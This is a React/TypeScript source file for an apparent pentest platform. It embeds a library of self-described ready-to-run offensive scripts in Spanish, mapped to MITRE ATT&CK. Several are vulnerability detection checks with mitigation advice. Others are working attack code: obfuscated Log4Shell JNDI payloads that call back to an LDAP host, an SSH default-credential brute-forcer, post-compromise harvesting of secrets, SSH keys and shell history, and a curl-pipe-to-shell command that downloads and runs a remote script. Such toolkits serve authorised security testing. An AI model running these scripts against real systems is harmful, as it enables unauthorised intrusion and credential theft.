/**
 * Scripts — Biblioteca de scripts ofensivos listos para ejecutar.
 * Integrado con Arsenal (herramientas) y Técnicas (MITRE ATT&CK).
 */

import { useState, useMemo, useEffect } from 'react'
import {
  Search, Download, Copy, Check, FileCode2, ChevronRight, ChevronDown,
  Plus, Pencil, Trash2, X, ExternalLink, Shield, AlertTriangle, Info,
} from 'lucide-react'
import { Link } from '@tanstack/react-router'
import { toast } from 'sonner'
import { Input } from '@/components/ui/input'
import { Button } from '@/components/ui/button'
import { Badge } from '@/components/ui/badge'
import { Textarea } from '@/components/ui/textarea'
import { cn } from '@/lib/utils'
import { apiFetch } from '@/lib/api'
import { useAuthStore } from '@/stores/auth-store'

// ─── Tipos ────────────────────────────────────────────────────────────────────
type Platform   = 'linux' | 'windows' | 'cross'
type Lang       = 'bash' | 'powershell' | 'python' | 'batch'
type ScriptType = 'detection' | 'exploitation' | 'enum' | 'privesc' | 'persistence' | 'lateral' | 'exfil' | 'wireless'
type Severity   = 'info' | 'low' | 'medium' | 'high' | 'critical'

interface Script {
  id: string
  name: string
  description: string
  category: string
  platform: Platform
  language: Lang
  content: string
  mitre_ids: string[]
  related_tools: string[]
  tags: string[]
  notes?: string
  severity: Severity
  script_type: ScriptType
  isCustom?: boolean
  isModified?: boolean
  author_name?: string
}

// ─── Metadatos ────────────────────────────────────────────────────────────────
const PLATFORM_LABEL: Record<Platform, string> = { linux: '🐧 Linux', windows: '🪟 Windows', cross: '🔄 Cross' }
const LANG_LABEL: Record<Lang, string>          = { bash: 'Bash', powershell: 'PowerShell', python: 'Python', batch: 'Batch' }
const LANG_EXT: Record<Lang, string>            = { bash: '.sh', powershell: '.ps1', python: '.py', batch: '.bat' }

const SEVERITY_META: Record<Severity, { label: string; cls: string }> = {
  info:     { label: 'Info',     cls: 'text-zinc-400  bg-zinc-800/80  border-zinc-700'  },
  low:      { label: 'Bajo',     cls: 'text-blue-400  bg-blue-900/30  border-blue-700'  },
  medium:   { label: 'Medio',    cls: 'text-yellow-400 bg-yellow-900/30 border-yellow-700' },
  high:     { label: 'Alto',     cls: 'text-orange-400 bg-orange-900/30 border-orange-700' },
  critical: { label: 'Crítico',  cls: 'text-red-400   bg-red-900/30   border-red-700'   },
}

const TYPE_LABEL: Record<ScriptType, string> = {
  detection:   'Detección',
  exploitation:'Explotación',
  enum:        'Enumeración',
  privesc:     'PrivEsc',
  persistence: 'Persistencia',
  lateral:     'Lateral',
  exfil:       'Exfiltración',
  wireless:    'Wireless',
}

const CATEGORIES = [
  'Detección de vulnerabilidades',
  'Enumeración y reconocimiento',
  'Auditoría de credenciales',
  'Escalación de privilegios',
  'Post-explotación',
  'Active Directory / Windows',
  'Wireless / WiFi',
  'General',
]

// ─── Scripts hardcoded ────────────────────────────────────────────────────────
const BUILTIN_SCRIPTS: Script[] = [
  // ── Detección de vulnerabilidades ──────────────────────────────────────────
  {
    id: 'b_eternalblue',
    name: 'EternalBlue — MS17-010 Check',
    category: 'Detección de vulnerabilidades',
    platform: 'cross', language: 'bash',
    severity: 'critical', script_type: 'detection',
    description: 'Verifica si uno o más hosts son vulnerables a EternalBlue (MS17-010/WannaCry) usando los scripts NSE de Nmap. Identifica hosts con SMB expuesto y el parche faltante.',
    mitre_ids: ['T1190', 'T1210'],
    related_tools: ['nmap'],
    tags: ['smb', 'ms17-010', 'wannacry', 'windows'],
    notes: 'Requiere nmap con scripts NSE. Ejecutar como root para mejores resultados.',
    content: `#!/bin/bash
# ═══════════════════════════════════════════════════════════════
# Gungnir — EternalBlue / MS17-010 Detection Script
# Detecta si los hosts objetivo son vulnerables a EternalBlue.
# MITRE ATT&CK: T1190, T1210
# Requiere: nmap
# Uso: ./eternalblue_check.sh <target> [output.txt]
# ═══════════════════════════════════════════════════════════════

RED='\\033[0;31m'; GREEN='\\033[0;32m'; YELLOW='\\033[1;33m'; NC='\\033[0m'

TARGET=\${1:-}
OUTPUT=\${2:-"eb_results_$(date +%Y%m%d_%H%M%S).txt"}

if [ -z "$TARGET" ]; then
  echo "Uso: $0 <target-ip|range|file> [output.txt]"
  echo "Ejemplos:"
  echo "  $0 192.168.1.100"
  echo "  $0 192.168.1.0/24"
  exit 1
fi

if ! command -v nmap &>/dev/null; then
  echo -e "\${RED}[!] nmap no encontrado. Instalar: apt install nmap\${NC}"
  exit 1
fi

echo -e "\${YELLOW}[*] Gungnir — EternalBlue Scanner\${NC}"
echo -e "[*] Target  : $TARGET"
echo -e "[*] Output  : $OUTPUT"
echo -e "[*] Inicio  : $(date)"
echo "═══════════════════════════════════════════"

# Primero verificar qué hosts tienen SMB abierto
echo -e "\\n\${YELLOW}[*] Fase 1: Descubriendo hosts con SMB (puerto 445)...\${NC}"
ALIVE=$(nmap -p 445 --open -T4 "$TARGET" -oG - 2>/dev/null | grep "445/open" | awk '{print $2}')

if [ -z "$ALIVE" ]; then
  echo -e "\${GREEN}[-] No se encontraron hosts con SMB abierto.\${NC}"
  exit 0
fi

HOST_COUNT=$(echo "$ALIVE" | wc -l)
echo -e "[+] Hosts con SMB activo: $HOST_COUNT"

# Verificar MS17-010 en hosts con SMB
echo -e "\\n\${YELLOW}[*] Fase 2: Verificando MS17-010 en hosts activos...\${NC}\\n"

VULN_COUNT=0
SAFE_COUNT=0

while read -r HOST; do
  RESULT=$(nmap -p 445 --script smb-vuln-ms17-010 -T4 "$HOST" 2>/dev/null)

  if echo "$RESULT" | grep -q "VULNERABLE"; then
    echo -e "\${RED}[VULNERABLE]\${NC} $HOST — MS17-010 (EternalBlue)"
    echo "[VULNERABLE] $HOST — MS17-010 (EternalBlue)" >> "$OUTPUT"
    ((VULN_COUNT++))
  elif echo "$RESULT" | grep -q "NT_STATUS_ACCESS_DENIED"; then
    echo -e "\${YELLOW}[AUTH REQUERIDA]\${NC} $HOST — No se pudo verificar (requiere autenticación)"
    echo "[AUTH REQUIRED] $HOST" >> "$OUTPUT"
  else
    echo -e "\${GREEN}[SAFE]\${NC} $HOST — No vulnerable"
    echo "[SAFE] $HOST" >> "$OUTPUT"
    ((SAFE_COUNT++))
  fi
done <<< "$ALIVE"

echo "═══════════════════════════════════════════"
echo -e "\\n[*] RESUMEN:"
echo -e "  \${RED}Vulnerables : $VULN_COUNT\${NC}"
echo -e "  \${GREEN}Seguros     : $SAFE_COUNT\${NC}"
echo -e "[*] Resultados guardados en: $OUTPUT"
echo ""
echo "[*] MITIGACIÓN: Aplicar MS17-010 (KB4012212) o deshabilitar SMBv1."
echo "[*] Referencia: https://attack.mitre.org/techniques/T1210/"`,
  },
  {
    id: 'b_smb_relay',
    name: 'SMB Signing Check — Relay Attack Surface',
    category: 'Detección de vulnerabilidades',
    platform: 'cross', language: 'bash',
    severity: 'high', script_type: 'detection',
    description: 'Identifica hosts en la red con SMB Signing deshabilitado, que son vulnerables a ataques de relay NTLM (PetitPotam, NTLM Relay). Un host sin signing acepta conexiones no firmadas.',
    mitre_ids: ['T1557', 'T1550'],
    related_tools: ['nmap', 'crackmapexec', 'responder'],
    tags: ['smb', 'ntlm-relay', 'signing', 'windows', 'mitm'],
    notes: 'Hosts sin SMB signing son el prerequisito para ataques de relay. Combinar con Responder/ntlmrelayx.',
    content: `#!/bin/bash
# ═══════════════════════════════════════════════════════════════
# Gungnir — SMB Signing Check
# Detecta hosts con SMB Signing deshabilitado (vulnerables a relay)
# MITRE ATT&CK: T1557, T1550
# Requiere: nmap o crackmapexec
# Uso: ./smb_signing_check.sh <target-range>
# ═══════════════════════════════════════════════════════════════

RED='\\033[0;31m'; GREEN='\\033[0;32m'; YELLOW='\\033[1;33m'; NC='\\033[0m'

TARGET=\${1:-"192.168.1.0/24"}
OUTPUT="smb_signing_$(date +%Y%m%d_%H%M%S).txt"

echo -e "\${YELLOW}[*] Gungnir — SMB Signing Audit\${NC}"
echo -e "[*] Target: $TARGET"
echo "═══════════════════════════════════════════"

# Método 1: nmap NSE
if command -v nmap &>/dev/null; then
  echo -e "\\n\${YELLOW}[*] Usando nmap smb2-security-mode...\${NC}\\n"
  nmap -p 445 --script smb2-security-mode -T4 "$TARGET" --open 2>/dev/null | \
    awk '
      /Nmap scan report for/ { host=$NF }
      /Message signing enabled but not required/ { print "\\033[0;31m[SIGNING DISABLED]\\033[0m " host }
      /Message signing enabled and required/     { print "\\033[0;32m[SIGNING REQUIRED]\\033[0m " host }
    ' | tee "$OUTPUT"
fi

# Método 2: crackmapexec (más rápido, mejor output)
if command -v crackmapexec &>/dev/null; then
  echo -e "\\n\${YELLOW}[*] Verificando con CrackMapExec...\${NC}\\n"
  crackmapexec smb "$TARGET" --gen-relay-list relay_targets.txt 2>/dev/null
  if [ -s relay_targets.txt ]; then
    echo -e "\${RED}[!] Hosts sin SMB signing (relay targets):\${NC}"
    cat relay_targets.txt
    echo -e "\${YELLOW}[*] Lista guardada en: relay_targets.txt\${NC}"
  fi
fi

echo ""
echo "═══════════════════════════════════════════"
echo "[*] IMPACTO: Hosts sin signing aceptan conexiones no autenticadas."
echo "[*] Permite: NTLM Relay → LDAP, SMB, HTTP → escalación o acceso."
echo "[*] MITIGACIÓN: Habilitar 'Microsoft network server: Digitally sign communications'"
echo "[*] via GPO: Computer Config → Windows Settings → Security Settings → Local Policies."`,
  },
  {
    id: 'b_log4shell',
    name: 'Log4Shell — CVE-2021-44228 Detector',
    category: 'Detección de vulnerabilidades',
    platform: 'linux', language: 'bash',
    severity: 'critical', script_type: 'detection',
    description: 'Detecta posibles instancias vulnerables a Log4Shell (CVE-2021-44228) enviando payloads de prueba en headers HTTP comunes. Usa un servidor LDAP local (interactsh o similar) para callback.',
    mitre_ids: ['T1190', 'T1203'],
    related_tools: ['curl', 'nuclei'],
    tags: ['log4shell', 'java', 'rce', 'cve-2021-44228', 'web'],
    notes: 'Para callback real usar interactsh (interactsh.com) o Burp Collaborator. Sin callback solo detecta reflexión en errores.',
    content: `#!/bin/bash
# ═══════════════════════════════════════════════════════════════
# Gungnir — Log4Shell CVE-2021-44228 Detection
# Prueba headers HTTP con payloads JNDI para detectar Log4j vulnerable.
# MITRE ATT&CK: T1190, T1203
# Requiere: curl, (opcional) nuclei, interactsh-client
# Uso: ./log4shell_check.sh <url> [callback-url]
# ═══════════════════════════════════════════════════════════════

RED='\\033[0;31m'; GREEN='\\033[0;32m'; YELLOW='\\033[1;33m'; NC='\\033[0m'

TARGET_URL=\${1:-}
CALLBACK=\${2:-"YOUR-INTERACTSH-URL.oast.fun"}

if [ -z "$TARGET_URL" ]; then
  echo "Uso: $0 <url> [callback-interactsh]"
  echo "Ejemplo: $0 https://target.com/api/login tu-id.oast.fun"
  exit 1
fi

echo -e "\${YELLOW}[*] Gungnir — Log4Shell Scanner\${NC}"
echo -e "[*] Target  : $TARGET_URL"
echo -e "[*] Callback: $CALLBACK"
echo "═══════════════════════════════════════════"

# Payloads JNDI (variantes para bypass de WAF)
PAYLOADS=(
  '\${jndi:ldap://'"$CALLBACK"'/a}'
  '\${j\${::-n}di:ldap://'"$CALLBACK"'/b}'
  '\${j\${lower:n}di:ldap://'"$CALLBACK"'/c}'
  '\${\${::-j}\${::-n}\${::-d}\${::-i}:ldap://'"$CALLBACK"'/d}'
  '\${jndi:\${lower:l}\${lower:d}ap://'"$CALLBACK"'/e}'
)

# Headers a probar
HEADERS=("User-Agent" "X-Forwarded-For" "X-Api-Version" "Referer" "X-Forwarded-Host" "X-Custom-Header" "Authorization" "Accept-Language")

echo -e "\\n\${YELLOW}[*] Probando \${#HEADERS[@]} headers x \${#PAYLOADS[@]} payloads...\${NC}\\n"

for PAYLOAD in "\${PAYLOADS[@]}"; do
  for HEADER in "\${HEADERS[@]}"; do
    RESPONSE=$(curl -sk -m 5 -w "\\n%{http_code}" \
      -H "$HEADER: $PAYLOAD" \
      -H "Accept: */*" \
      "$TARGET_URL" 2>/dev/null | tail -1)

    if [ "$RESPONSE" != "000" ] && [ -n "$RESPONSE" ]; then
      echo -e "  [\${GREEN}OK\${NC}] $HEADER → HTTP $RESPONSE"
    else
      echo -e "  [TIMEOUT] $HEADER"
    fi
  done
done

echo ""
echo "═══════════════════════════════════════════"
echo -e "\${YELLOW}[*] Verificar callbacks en: https://app.interactsh.com\${NC}"
echo "[*] Si hay callbacks LDAP/DNS → host VULNERABLE a Log4Shell."
echo ""
echo -e "\${YELLOW}[*] Escaneo rápido con Nuclei (si disponible):\${NC}"
echo "    nuclei -u $TARGET_URL -t cves/2021/CVE-2021-44228.yaml"
echo ""
echo "[*] Referencia: https://attack.mitre.org/techniques/T1190/"`,
  },
  {
    id: 'b_llmnr_check',
    name: 'LLMNR / NBT-NS Poisoning — Windows Check',
    category: 'Detección de vulnerabilidades',
    platform: 'windows', language: 'powershell',
    severity: 'high', script_type: 'detection',
    description: 'Verifica si LLMNR y NBT-NS están habilitados en el host Windows. Cuando están activos, Responder puede envenenar estas queries y capturar hashes NetNTLMv2.',
    mitre_ids: ['T1557'],
    related_tools: ['responder'],
    tags: ['llmnr', 'nbt-ns', 'windows', 'mitm', 'netntlm'],
    notes: 'Ejecutar como admin para ver todas las políticas. Ideal para auditoría de red corporativa.',
    content: `# ═══════════════════════════════════════════════════════════════
# Gungnir — LLMNR / NBT-NS Check
# Verifica si el host es susceptible a ataques de poisoning LLMNR.
# MITRE ATT&CK: T1557
# Requiere: PowerShell (admin recomendado)
# Uso: .\\llmnr_check.ps1
# ═══════════════════════════════════════════════════════════════

Write-Host ""
Write-Host "=== Gungnir — LLMNR / NBT-NS Poisoning Check ===" -ForegroundColor Yellow
Write-Host ""

$issues = @()

# --- Verificar LLMNR via registro ---
Write-Host "[*] Verificando LLMNR..." -ForegroundColor Cyan
$llmnrKey = "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\DNSClient"
$llmnrVal = Get-ItemProperty -Path $llmnrKey -Name "EnableMulticast" -ErrorAction SilentlyContinue

if ($llmnrVal -and $llmnrVal.EnableMulticast -eq 0) {
    Write-Host "  [SAFE] LLMNR deshabilitado via GPO." -ForegroundColor Green
} else {
    Write-Host "  [VULN] LLMNR HABILITADO — susceptible a poisoning!" -ForegroundColor Red
    $issues += "LLMNR habilitado"
}

# --- Verificar NBT-NS en todas las NICs ---
Write-Host ""
Write-Host "[*] Verificando NBT-NS en adaptadores de red..." -ForegroundColor Cyan

$adapters = Get-WmiObject -Class Win32_NetworkAdapterConfiguration -Filter "IPEnabled=True"
foreach ($adapter in $adapters) {
    $nbt = $adapter.TcpipNetbiosOptions
    # 0=default(enabled), 1=enabled, 2=disabled
    if ($nbt -eq 2) {
        Write-Host "  [SAFE] $($adapter.Description): NBT-NS deshabilitado." -ForegroundColor Green
    } else {
        Write-Host "  [VULN] $($adapter.Description): NBT-NS HABILITADO (valor: $nbt)" -ForegroundColor Red
        $issues += "NBT-NS habilitado en $($adapter.Description)"
    }
}

# --- Verificar mDNS ---
Write-Host ""
Write-Host "[*] Verificando mDNS..." -ForegroundColor Cyan
$mdnsKey = "HKLM:\\SYSTEM\\CurrentControlSet\\Services\\Dnscache\\Parameters"
$mdnsVal = Get-ItemProperty -Path $mdnsKey -Name "EnableMDNS" -ErrorAction SilentlyContinue
if ($mdnsVal -and $mdnsVal.EnableMDNS -eq 0) {
    Write-Host "  [SAFE] mDNS deshabilitado." -ForegroundColor Green
} else {
    Write-Host "  [WARN] mDNS habilitado (Windows 10+)." -ForegroundColor Yellow
}

# --- Resumen ---
Write-Host ""
Write-Host "═══════════════════════════════════════════" -ForegroundColor DarkGray
if ($issues.Count -eq 0) {
    Write-Host "[OK] Host correctamente configurado." -ForegroundColor Green
} else {
    Write-Host "[!] PROBLEMAS ENCONTRADOS:" -ForegroundColor Red
    $issues | ForEach-Object { Write-Host "    - $_" -ForegroundColor Red }
    Write-Host ""
    Write-Host "MITIGACIÓN:" -ForegroundColor Yellow
    Write-Host "  LLMNR  → GPO: Computer Config > Admin Templates > Network > DNS Client > Turn off multicast"
    Write-Host "  NBT-NS → NIC Properties > IPv4 > Advanced > WINS > Disable NetBIOS over TCP/IP"
}
Write-Host ""`,
  },
  {
    id: 'b_default_creds',
    name: 'Default Credentials — SSH / HTTP Checker',
    category: 'Auditoría de credenciales',
    platform: 'linux', language: 'bash',
    severity: 'high', script_type: 'detection',
    description: 'Prueba credenciales por defecto en servicios SSH y HTTP de una lista de hosts. Reporta accesos exitosos. Para uso en auditorías autorizadas de redes corporativas o IoT.',
    mitre_ids: ['T1110', 'T1133'],
    related_tools: ['hydra', 'nmap'],
    tags: ['default-creds', 'ssh', 'http', 'brute-force', 'iot'],
    notes: 'SOLO usar en redes propias o con autorización explícita. Ajustar DEFAULT_CREDS y TARGETS según el engagement.',
    content: `#!/bin/bash
# ═══════════════════════════════════════════════════════════════
# Gungnir — Default Credentials Checker
# Prueba credenciales por defecto en SSH y servicios HTTP básicos.
# MITRE ATT&CK: T1110, T1133
# Requiere: nmap, sshpass (apt install sshpass)
# ADVERTENCIA: Solo usar con autorización explícita.
# Uso: ./default_creds.sh <target-range>
# ═══════════════════════════════════════════════════════════════

RED='\\033[0;31m'; GREEN='\\033[0;32m'; YELLOW='\\033[1;33m'; NC='\\033[0m'

TARGET_RANGE=\${1:-"192.168.1.0/24"}
TIMEOUT=3

# Credenciales por defecto más comunes
declare -A DEFAULT_CREDS=(
  ["admin"]="admin password 1234 12345 admin123 root"
  ["root"]="root toor admin password 1234 root123"
  ["user"]="user password 1234 user123"
  ["administrator"]="administrator password admin admin123"
  ["pi"]="raspberry"
  ["ubnt"]="ubnt"
  ["cisco"]="cisco admin"
)

echo -e "\${YELLOW}[*] Gungnir — Default Credentials Scanner\${NC}"
echo -e "[*] Target : $TARGET_RANGE"
echo "[*] ADVERTENCIA: Solo usar en redes autorizadas"
echo "═══════════════════════════════════════════"

# Descubrir hosts con SSH abierto
echo -e "\\n\${YELLOW}[*] Escaneando SSH (puerto 22)...\${NC}"
SSH_HOSTS=$(nmap -p 22 --open -T4 "$TARGET_RANGE" -oG - 2>/dev/null | grep "22/open" | awk '{print $2}')

if [ -z "$SSH_HOSTS" ]; then
  echo "[-] No se encontraron hosts con SSH."
else
  echo -e "[+] Hosts con SSH: $(echo "$SSH_HOSTS" | wc -l)\\n"

  while read -r HOST; do
    echo -e "\${YELLOW}[*] Probando $HOST...\${NC}"
    for USER in "\${!DEFAULT_CREDS[@]}"; do
      for PASS in \${DEFAULT_CREDS[$USER]}; do
        RESULT=$(sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no \
          -o ConnectTimeout=$TIMEOUT -o BatchMode=no \
          -o PasswordAuthentication=yes \
          "$USER@$HOST" "echo OK" 2>/dev/null)

        if [ "$RESULT" = "OK" ]; then
          echo -e "  \${RED}[ACCESO] $HOST — $USER:$PASS\${NC}"
          echo "ACCESO SSH: $HOST | $USER:$PASS" >> "default_creds_results.txt"
        fi
      done
    done
  done <<< "$SSH_HOSTS"
fi

echo ""
echo "═══════════════════════════════════════════"
echo "[*] Resultados en: default_creds_results.txt"
echo "[*] Para HTTP: usar gobuster/ffuf con credenciales comunes."`,
  },
  // ── Enumeración ────────────────────────────────────────────────────────────
  {
    id: 'b_linux_enum',
    name: 'Linux Quick Enum — System Recon',
    category: 'Enumeración y reconocimiento',
    platform: 'linux', language: 'bash',
    severity: 'info', script_type: 'enum',
    description: 'Enumeración rápida del sistema Linux post-compromiso: OS, kernel, usuarios, grupos, sudoers, cron, servicios, conexiones de red y variables de entorno sensibles.',
    mitre_ids: ['T1082', 'T1087', 'T1069'],
    related_tools: ['linpeas'],
    tags: ['linux', 'enum', 'post-exploitation', 'recon'],
    notes: 'Para enumeración completa usar LinPEAS. Este script es el punto de partida rápido.',
    content: `#!/bin/bash
# ═══════════════════════════════════════════════════════════════
# Gungnir — Linux Quick Enumeration
# Recopila información del sistema para análisis post-compromiso.
# MITRE ATT&CK: T1082, T1087, T1069
# Uso: ./linux_enum.sh [output.txt]
# ═══════════════════════════════════════════════════════════════

YELLOW='\\033[1;33m'; GREEN='\\033[0;32m'; NC='\\033[0m'
OUT=\${1:-"/tmp/enum_$(hostname)_$(date +%Y%m%d).txt"}

section() { echo -e "\\n\${YELLOW}══ $1 ══\${NC}"; echo "\\n=== $1 ===" >> "$OUT" 2>/dev/null; }
run()     { echo -e "\${GREEN}[>]\${NC} $@"; eval "$@" 2>/dev/null | tee -a "$OUT"; }

echo -e "\${YELLOW}[*] Gungnir — Linux System Enum\${NC}" | tee "$OUT"
echo "[*] Host: $(hostname) | $(date)" | tee -a "$OUT"
echo "═══════════════════════════════════════════" | tee -a "$OUT"

section "Sistema Operativo"
run "cat /etc/os-release"
run "uname -a"
run "cat /proc/version"

section "Usuario Actual"
run "id"
run "whoami"
run "groups"

section "Todos los Usuarios"
run "cat /etc/passwd | grep -v nologin | grep -v false"

section "Usuarios con Shell"
run "grep -E '(/bin/bash|/bin/sh|/bin/zsh)' /etc/passwd"

section "Grupos Interesantes"
run "getent group sudo docker lxd adm disk shadow"

section "Sudo Permissions"
run "sudo -l 2>/dev/null || echo 'No sudo access'"

section "Archivos SUID / SGID"
run "find / -perm -4000 -type f 2>/dev/null | sort"
run "find / -perm -2000 -type f 2>/dev/null | sort"

section "Cron Jobs"
run "crontab -l 2>/dev/null"
run "ls -la /etc/cron* 2>/dev/null"
run "cat /etc/crontab 2>/dev/null"
run "find /var/spool/cron -type f 2>/dev/null"

section "Servicios Activos"
run "systemctl list-units --type=service --state=running 2>/dev/null | head -30"
run "ps aux | grep -v grep | head -30"

section "Puertos en Escucha"
run "ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null"

section "Interfaces de Red"
run "ip a"
run "cat /etc/hosts"

section "Variables de Entorno (sensibles)"
run "env | grep -iE 'pass|key|secret|token|api|aws|db' | grep -v '_TERM\|_COLOR'"

section "Archivos Sensibles (lectura)"
run "ls -la /etc/shadow /etc/sudoers 2>/dev/null"
run "find / -name '*.conf' -readable 2>/dev/null | xargs grep -l 'password' 2>/dev/null | head -10"
run "find /home -name '*.ssh' -o -name 'authorized_keys' -o -name 'id_rsa' 2>/dev/null"

section "Historial de Comandos"
run "find /home /root -name '.*_history' -readable 2>/dev/null | xargs cat 2>/dev/null | tail -50"

echo -e "\\n\${YELLOW}[*] Enum completada. Resultados: $OUT\${NC}"`,
  },
  {
    id: 'b_network_disco',
    name: 'Network Discovery — ARP + Port Scan',
    category: 'Enumeración y reconocimiento',
    platform: 'linux', language: 'bash',
    severity: 'info', script_type: 'enum',
    description: 'Descubrimiento de hosts activos en la red local via ARP (capa 2, no filtrado por firewalls). Luego escaneo de puertos comunes en los hosts encontrados.',
    mitre_ids: ['T1018', 'T1046'],
    related_tools: ['nmap', 'masscan'],
    tags: ['network', 'arp', 'discovery', 'lan', 'recon'],
    notes: 'ARP discovery solo funciona en la red local (mismo segmento). Para redes remotas usar nmap ping scan.',
    content: `#!/bin/bash
# ═══════════════════════════════════════════════════════════════
# Gungnir — Network Discovery Script
# Descubrimiento ARP + port scan de servicios comunes en LAN.
# MITRE ATT&CK: T1018, T1046
# Requiere: nmap, arp-scan (apt install arp-scan)
# Uso: ./network_disco.sh [interfaz] [subnet]
# ═══════════════════════════════════════════════════════════════

YELLOW='\\033[1;33m'; GREEN='\\033[0;32m'; NC='\\033[0m'

IFACE=\${1:-$(ip route | grep default | awk '{print $5}' | head -1)}
SUBNET=\${2:-$(ip -4 addr show "$IFACE" 2>/dev/null | grep inet | awk '{print $2}' | head -1)}
PORTS="21,22,23,25,53,80,110,135,139,143,443,445,1433,3306,3389,5432,5985,6379,8080,8443,8888,27017"

echo -e "\${YELLOW}[*] Gungnir — Network Discovery\${NC}"
echo -e "[*] Interfaz: $IFACE"
echo -e "[*] Subnet  : $SUBNET"
echo "═══════════════════════════════════════════"

# Fase 1: ARP Discovery (detecta hosts que ignoran ICMP)
echo -e "\\n\${YELLOW}[*] Fase 1: ARP Discovery...\${NC}"
if command -v arp-scan &>/dev/null; then
  ARP_HOSTS=$(arp-scan -I "$IFACE" -l 2>/dev/null | grep -E '^[0-9]' | awk '{print $1, $2, $3}')
  echo "$ARP_HOSTS" | column -t
  HOSTS=$(echo "$ARP_HOSTS" | awk '{print $1}')
else
  echo "[-] arp-scan no disponible. Usando nmap ARP..."
  HOSTS=$(nmap -sn "$SUBNET" -PR 2>/dev/null | grep "Nmap scan" | awk '{print $NF}')
fi

HOST_COUNT=$(echo "$HOSTS" | grep -c .)
echo -e "\\n[+] Hosts descubiertos: $HOST_COUNT"

# Fase 2: Port scan de servicios comunes
echo -e "\\n\${YELLOW}[*] Fase 2: Escaneando puertos comunes en hosts activos...\${NC}\\n"
echo "$HOSTS" | while read -r HOST; do
  [ -z "$HOST" ] && continue
  echo -e "\${GREEN}[*] $HOST\${NC}"
  nmap -p "$PORTS" -T4 --open -sV "$HOST" 2>/dev/null | \
    grep -E "open|filtered" | grep -v "^#" | \
    awk '{printf "    %-8s %-12s %s\\n", $1, $3, $4}'
done

echo ""
echo "═══════════════════════════════════════════"
echo "[*] Discovery completado. Para escaneo completo: masscan / nmap -p-"`,
  },
  // ── Escalación de privilegios ──────────────────────────────────────────────
  {
    id: 'b_suid_finder',
    name: 'SUID / SGID Finder — GTFOBins Check',
    category: 'Escalación de privilegios',
    platform: 'linux', language: 'bash',
    severity: 'high', script_type: 'privesc',
    description: 'Busca binarios con SUID/SGID en el sistema y verifica cuáles aparecen en GTFOBins (explotables para privesc). Incluye verificación de capabilities y sudo mal configurado.',
    mitre_ids: ['T1548', 'T1068'],
    related_tools: ['linpeas'],
    tags: ['suid', 'sgid', 'privesc', 'gtfobins', 'linux'],
    notes: 'Ver https://gtfobins.github.io para la técnica de explotación de cada binario encontrado.',
    content: `#!/bin/bash
# ═══════════════════════════════════════════════════════════════
# Gungnir — SUID/SGID Finder + GTFOBins Check
# Detecta vectores de escalación via binarios mal configurados.
# MITRE ATT&CK: T1548, T1068
# Uso: ./suid_finder.sh
# ═══════════════════════════════════════════════════════════════

RED='\\033[0;31m'; YELLOW='\\033[1;33m'; GREEN='\\033[0;32m'; NC='\\033[0m'

# Subset de GTFOBins más comunes explotables con SUID
GTFOBINS=(
  "bash" "sh" "dash" "zsh" "python" "python3" "python2" "perl" "ruby" "lua"
  "awk" "gawk" "mawk" "nawk" "find" "vim" "vi" "nano" "less" "more"
  "cp" "mv" "cat" "tee" "dd" "tar" "zip" "unzip" "gzip" "curl" "wget"
  "nmap" "strace" "ltrace" "env" "base64" "openssl" "rsync" "scp"
  "php" "node" "nodejs" "ruby" "socat" "netcat" "nc" "ncat"
  "man" "git" "ftp" "ssh" "docker" "lxc" "rsyncd"
  "mount" "umount" "apt" "yum" "pip" "npm"
  "aria2c" "crontab" "make" "mysql" "sqlite3" "psql"
)

echo -e "\${YELLOW}[*] Gungnir — SUID/SGID & Capabilities Finder\${NC}"
echo -e "[*] Host: $(hostname) | $(date)"
echo "═══════════════════════════════════════════"

# --- SUID Binaries ---
echo -e "\\n\${YELLOW}[*] Buscando SUID (ejecución como root)...\${NC}\\n"
SUID_BINS=$(find / -perm -4000 -type f 2>/dev/null | sort)

if [ -z "$SUID_BINS" ]; then
  echo "[-] No se encontraron binarios SUID."
else
  while read -r BIN; do
    BIN_NAME=$(basename "$BIN")
    OWNER=$(stat -c '%U' "$BIN" 2>/dev/null)
    if printf '%s\\n' "\${GTFOBINS[@]}" | grep -qx "$BIN_NAME"; then
      echo -e "  \${RED}[GTFOBins]\${NC} $BIN (owner: $OWNER)"
    else
      echo -e "  [SUID] $BIN (owner: $OWNER)"
    fi
  done <<< "$SUID_BINS"
fi

# --- SGID Binaries ---
echo -e "\\n\${YELLOW}[*] Buscando SGID...\${NC}\\n"
find / -perm -2000 -type f 2>/dev/null | sort | while read -r BIN; do
  echo -e "  [SGID] $BIN"
done

# --- Capabilities ---
echo -e "\\n\${YELLOW}[*] Verificando capabilities...\${NC}\\n"
if command -v getcap &>/dev/null; then
  CAPS=$(getcap -r / 2>/dev/null)
  if [ -n "$CAPS" ]; then
    echo "$CAPS" | while read -r CAP_LINE; do
      echo -e "  \${RED}[CAPABILITY]\${NC} $CAP_LINE"
    done
  else
    echo "[-] Sin capabilities configuradas."
  fi
fi

# --- Sudo permissions ---
echo -e "\\n\${YELLOW}[*] Verificando sudo...\${NC}\\n"
sudo -l 2>/dev/null | grep -v "^Matching\|^User\|^Defaults" | while read -r LINE; do
  BIN=$(echo "$LINE" | grep -oE '/[^ ]+' | head -1)
  BIN_NAME=$(basename "$BIN")
  if printf '%s\\n' "\${GTFOBINS[@]}" | grep -qx "$BIN_NAME"; then
    echo -e "  \${RED}[GTFOBins+SUDO]\${NC} $LINE"
  else
    echo -e "  [SUDO] $LINE"
  fi
done

echo ""
echo "═══════════════════════════════════════════"
echo "[*] Exploits en: https://gtfobins.github.io"
echo "[*] Para análisis completo: curl -sL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh"`,
  },
  {
    id: 'b_sudo_abuse',
    name: 'Sudo Misconfiguration Analyzer',
    category: 'Escalación de privilegios',
    platform: 'linux', language: 'bash',
    severity: 'high', script_type: 'privesc',
    description: 'Analiza la configuración de sudo en busca de reglas explotables: NOPASSWD, wildcard abuse, comandos que permiten shell spawn o escritura de archivos con privilegios.',
    mitre_ids: ['T1548'],
    related_tools: ['linpeas'],
    tags: ['sudo', 'privesc', 'linux', 'misconfiguration'],
    notes: 'Requiere acceso al sistema como usuario sin privilegios. Complementar con GTFOBins para saber cómo explotar cada entrada.',
    content: `#!/bin/bash
# ═══════════════════════════════════════════════════════════════
# Gungnir — Sudo Misconfiguration Analyzer
# Analiza sudo rules buscando vectores de escalación.
# MITRE ATT&CK: T1548
# Uso: ./sudo_check.sh
# ═══════════════════════════════════════════════════════════════

